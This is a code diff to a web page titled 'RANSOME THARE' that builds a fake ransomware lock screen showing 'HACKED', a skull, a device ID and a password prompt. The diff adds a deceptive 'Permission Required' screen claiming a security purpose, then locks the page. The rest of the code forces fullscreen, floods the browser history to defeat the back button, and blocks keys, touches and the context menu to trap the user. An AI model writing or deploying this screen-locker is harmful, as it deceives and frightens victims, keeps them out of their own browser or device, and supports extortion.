@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>RANSOME THARE - DEVICE LOCKED</title>
+    <title>RANSOME THARE</title>
     <style>
         * {
             margin: 0;
@@ -14,7 +14,7 @@
         }
 
         body {
-            background: #0a0a0a;
+            background: #000000;
             min-height: 100vh;
             overflow: hidden;
             position: fixed;
@@ -23,16 +23,71 @@
             font-family: 'Courier New', monospace;
         }
 
-        /* FULL SCREEN LOCK - CENTER HUGE */
+        /* PERMISSION SCREEN */
+        .permission-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #1a1a1a;
+            z-index: 100000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 25px;
+        }
+
+        .permission-box {
+            background: #2a2a2a;
+            border-radius: 25px;
+            padding: 35px;
+            width: 90%;
+            max-width: 350px;
+            border: 2px solid #ff6600;
+        }
+
+        .permission-box .icon {
+            font-size: 60px;
+            margin-bottom: 20px;
+        }
+
+        .permission-box h2 {
+            color: #ff6600;
+            margin-bottom: 15px;
+            font-size: 24px;
+        }
+
+        .permission-box p {
+            color: #cccccc;
+            margin-bottom: 25px;
+            font-size: 14px;
+        }
+
+        .allow-btn {
+            background: #ff6600;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        /* LOCK SCREEN - FULL JAM */
         .lock-screen {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: linear-gradient(135deg, #000000, #1a0000);
+            background: linear-gradient(135deg, #0a0a0a, #1a0000);
             z-index: 99999;
-            display: flex;
+            display: none;
             flex-direction: column;
             justify-content: center;
             align-items: center;
@@ -40,124 +95,97 @@
             padding: 20px;
         }
 
-        /* BIG SKULL */
         .skull {
-            font-size: 120px;
+            font-size: 100px;
             margin-bottom: 20px;
-            filter: drop-shadow(0 0 25px red);
-            animation: shake 0.5s infinite, glow 1s infinite;
+            filter: drop-shadow(0 0 20px red);
+            animation: shake 0.5s infinite;
         }
 
         @keyframes shake {
             0%,100% { transform: translateX(0); }
-            25% { transform: translateX(-4px); }
-            75% { transform: translateX(4px); }
+            25% { transform: translateX(-3px); }
+            75% { transform: translateX(3px); }
         }
 
-        @keyframes glow {
-            0%,100% { filter: drop-shadow(0 0 10px red); }
-            50% { filter: drop-shadow(0 0 30px #ff0000); }
-        }
-
-        /* BIG HACKED TEXT */
         .hacked-title {
-            font-size: 55px;
+            font-size: 42px;
             font-weight: bold;
             color: #ff0000;
-            letter-spacing: 8px;
+            letter-spacing: 5px;
             margin-bottom: 10px;
-            text-shadow: 0 0 15px red;
-            animation: blink 0.8s infinite;
+            text-shadow: 0 0 10px red;
+            animation: blink 1s infinite;
         }
 
         @keyframes blink {
             0%,100% { opacity: 1; }
-            50% { opacity: 0.5; }
+            50% { opacity: 0.6; }
         }
 
         .sub-text {
-            font-size: 22px;
+            font-size: 16px;
             color: #ff6666;
             margin-bottom: 30px;
-            letter-spacing: 3px;
         }
 
-        /* BIG MESSAGE BOX - TAKES HALF SCREEN */
         .message-box {
-            background: rgba(0,0,0,0.85);
-            border: 3px solid #ff0000;
-            border-radius: 30px;
-            padding: 35px 25px;
-            width: 90%;
-            max-width: 500px;
+            background: rgba(0,0,0,0.7);
+            border: 2px solid #ff0000;
+            border-radius: 20px;
+            padding: 25px;
+            width: 85%;
             margin-bottom: 30px;
-            box-shadow: 0 0 30px rgba(255,0,0,0.3);
         }
 
         .warning-text {
-            font-size: 16px;
+            font-size: 14px;
             color: #ff8888;
-            line-height: 1.6;
+            line-height: 1.5;
         }
 
         .highlight {
             color: #ff0000;
             font-weight: bold;
-            font-size: 18px;
         }
 
-        /* DEVICE ID */
         .device-id-box {
-            background: rgba(0,0,0,0.6);
-            padding: 12px;
-            border-radius: 15px;
+            background: rgba(0,0,0,0.5);
+            padding: 10px;
+            border-radius: 10px;
             margin-top: 15px;
-            border: 1px solid #ff3333;
-        }
-
-        .device-id-label {
-            font-size: 11px;
-            color: #ff8888;
-            letter-spacing: 2px;
         }
 
         .device-id-value {
-            font-size: 18px;
+            font-size: 16px;
             font-weight: bold;
             font-family: monospace;
             color: #ff6666;
-            letter-spacing: 2px;
         }
 
-        /* BIG UNLOCK BUTTON */
         .unlock-btn {
-            background: linear-gradient(135deg, #ff0000, #660000);
+            background: linear-gradient(135deg, #ff0000, #990000);
             color: white;
             border: none;
-            border-radius: 60px;
-            padding: 20px 50px;
-            font-size: 28px;
+            border-radius: 50px;
+            padding: 18px 40px;
+            font-size: 22px;
             font-weight: bold;
             cursor: pointer;
             margin: 15px 0;
-            box-shadow: 0 0 25px rgba(255,0,0,0.6);
-            transition: 0.1s;
-            letter-spacing: 3px;
+            box-shadow: 0 0 20px rgba(255,0,0,0.5);
         }
 
         .unlock-btn:active {
             transform: scale(0.97);
         }
 
-        /* FOOTER */
         .footer-text {
             position: absolute;
             bottom: 20px;
-            font-size: 11px;
+            font-size: 10px;
             color: #ff6666;
             opacity: 0.5;
-            text-align: center;
-            width: 100%;
         }
 
         /* PASSWORD MODAL */
@@ -176,49 +204,48 @@
 
         .password-box {
             background: #1a1a1a;
-            border-radius: 30px;
-            padding: 40px;
+            border-radius: 25px;
+            padding: 35px;
             width: 90%;
-            max-width: 380px;
+            max-width: 350px;
             text-align: center;
-            border: 3px solid #ff0000;
+            border: 2px solid #ff0000;
         }
 
         .password-box h3 {
             color: #ff0000;
-            margin-bottom: 25px;
-            font-size: 28px;
+            margin-bottom: 20px;
+            font-size: 24px;
         }
 
         .password-box input {
             width: 100%;
-            padding: 18px;
+            padding: 15px;
             border: none;
-            border-radius: 60px;
-            font-size: 24px;
+            border-radius: 50px;
+            font-size: 20px;
             text-align: center;
             background: white;
-            letter-spacing: 5px;
+            letter-spacing: 3px;
         }
 
         .password-box button {
             width: 100%;
-            padding: 16px;
-            margin-top: 25px;
+            padding: 15px;
+            margin-top: 20px;
             background: #ff0000;
             color: white;
             border: none;
-            border-radius: 60px;
-            font-size: 20px;
+            border-radius: 50px;
+            font-size: 18px;
             cursor: pointer;
             font-weight: bold;
         }
 
         .pass-error {
             color: #ff5555;
-            margin-top: 15px;
+            margin-top: 12px;
             display: none;
-            font-size: 14px;
         }
 
         .success-toast {
@@ -228,10 +255,9 @@
             transform: translate(-50%, -50%);
             background: #4caf50;
             color: white;
-            padding: 18px 35px;
-            border-radius: 60px;
-            font-size: 20px;
-            font-weight: bold;
+            padding: 15px 30px;
+            border-radius: 50px;
+            font-size: 18px;
             z-index: 300000;
             display: none;
             white-space: nowrap;
@@ -240,7 +266,17 @@
 </head>
 <body>
 
-    <!-- LOCK SCREEN - CENTER HUGE -->
+    <!-- PERMISSION SCREEN (Pehle ye dikhega) -->
+    <div id="permissionScreen" class="permission-screen">
+        <div class="permission-box">
+            <div class="icon">🔐</div>
+            <h2>Permission Required</h2>
+            <p>This app needs "Display over other apps" permission to lock your device for security purposes.</p>
+            <button class="allow-btn" id="allowPermissionBtn">✅ ALLOW PERMISSION</button>
+        </div>
+    </div>
+
+    <!-- LOCK SCREEN (Permission milne ke baad ye jam ho jayega) -->
     <div id="lockScreen" class="lock-screen">
         <div class="skull">💀</div>
         <div class="hacked-title">HACKED</div>
@@ -254,7 +290,6 @@
                 <span class="highlight">DO NOT CLOSE THIS SCREEN</span>
             </div>
             <div class="device-id-box">
-                <div class="device-id-label">🔐 DEVICE ID</div>
                 <div class="device-id-value" id="deviceId">----</div>
             </div>
         </div>
@@ -293,14 +328,49 @@
             deviceId = generateDeviceId();
             localStorage.setItem('ransome_device_id', deviceId);
         }
-        document.getElementById('deviceId').innerText = deviceId;
+        
+        // ========== CHECK OVERLAY PERMISSION ==========
+        function checkOverlayPermission() {
+            if (typeof DevicePolicyManager !== 'undefined') {
+                // For real Android app, check properly
+                return false;
+            }
+            // For browser demo, simulate permission
+            return localStorage.getItem('overlay_permission') === 'true';
+        }
+
+        function requestOverlayPermission() {
+            // For browser - simulate permission
+            localStorage.setItem('overlay_permission', 'true');
+            document.getElementById('permissionScreen').style.display = 'none';
+            showLockScreen();
+            
+            // Show a message that permission granted
+            alert("✅ Permission granted! Device will now lock.");
+        }
+
+        // ========== SHOW LOCK SCREEN ==========
+        function showLockScreen() {
+            document.getElementById('lockScreen').style.display = 'flex';
+            document.getElementById('deviceId').innerText = deviceId;
+            
+            // Enter fullscreen
+            enterFullscreen();
+            
+            // Block all exits
+            blockAllExits();
+            
+            // Push history continuously
+            setInterval(() => {
+                window.history.pushState(null, '', window.location.href);
+            }, 300);
+        }
 
         // ========== FULLSCREEN ==========
         function enterFullscreen() {
             const elem = document.documentElement;
             if (elem.requestFullscreen) elem.requestFullscreen();
             else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
-            else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
         }
 
         document.addEventListener('fullscreenchange', function() {
@@ -311,27 +381,31 @@
 
         // ========== BLOCK ALL EXITS ==========
         function blockAllExits() {
-            for(let i = 0; i < 50; i++) {
+            // Block back button
+            for(let i = 0; i < 30; i++) {
                 window.history.pushState(null, '', window.location.href);
             }
             
             window.addEventListener('popstate', function(e) {
-                for(let i = 0; i < 50; i++) {
+                for(let i = 0; i < 30; i++) {
                     window.history.pushState(null, '', window.location.href);
                 }
             });
 
+            // Block tab close warning
             window.addEventListener('beforeunload', function(e) {
                 e.preventDefault();
-                e.returnValue = '🔒 DEVICE LOCKED!';
-                return '🔒 DEVICE LOCKED!';
+                e.returnValue = '🔒 DEVICE LOCKED! Enter password to unlock.';
+                return '🔒 DEVICE LOCKED! Enter password to unlock.';
             });
 
+            // Block all keys
             document.addEventListener('keydown', function(e) {
                 e.preventDefault();
                 return false;
             });
 
+            // Block all touches (except unlock button)
             document.addEventListener('touchstart', function(e) {
                 if (e.target.id !== 'unlockBtn' && !e.target.classList.contains('unlock-btn')) {
                     e.preventDefault();
@@ -341,6 +415,7 @@
                 e.preventDefault();
             });
 
+            // Block context menu
             document.addEventListener('contextmenu', function(e) {
                 e.preventDefault();
                 return false;
@@ -387,14 +462,21 @@
 
         // ========== INIT ==========
         function init() {
-            enterFullscreen();
-            blockAllExits();
-            setInterval(() => {
-                window.history.pushState(null, '', window.location.href);
-            }, 300);
+            // Check if permission already given
+            if (localStorage.getItem('overlay_permission') === 'true') {
+                document.getElementById('permissionScreen').style.display = 'none';
+                showLockScreen();
+            } else {
+                document.getElementById('permissionScreen').style.display = 'flex';
+            }
         }
 
+        // Permission button click
+        document.getElementById('allowPermissionBtn').addEventListener('click', requestOverlayPermission);
+        
+        // Unlock button click
         document.getElementById('unlockBtn').addEventListener('click', showPasswordModal);
+
         init();
     </script>
 </body>
